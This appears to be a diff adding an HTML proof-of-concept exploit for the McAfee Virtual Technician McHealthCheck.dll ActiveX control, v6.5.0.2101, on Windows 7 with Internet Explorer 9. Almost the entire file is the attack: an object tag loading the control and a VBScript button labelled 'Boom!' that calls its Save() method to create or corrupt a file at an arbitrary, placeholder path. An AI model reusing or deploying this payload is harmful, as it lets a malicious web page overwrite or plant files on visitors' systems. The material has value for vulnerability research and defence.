@@ -1,0 +1,14 @@
+<html>
+<h4>McAfee Virtual Technician [McHealthCheck.dll] v.6.5.0.2101</h4>
+<h5>This proof of concepts creates an arbitrary file in a system [Windows 7, SP1 with IE 9.0] by leveraging the McHealthCheck.dll ActiveX module and the method "Save()":</h5>
+<object classid='clsid:24565A99-ADDA-47B9-9E86-3C4C3360E256' id='target'></object>
+<input type="button" value="Boom!" language="VBScript" OnClick="CreateArbitraryFile()">
+
+<script language="VBScript">
+sub CreateArbitraryFile()
+arg1="FilePath\File_name_to_corrupt_or_create"
+target.Save arg1
+End Sub
+
+</script>
+</html>
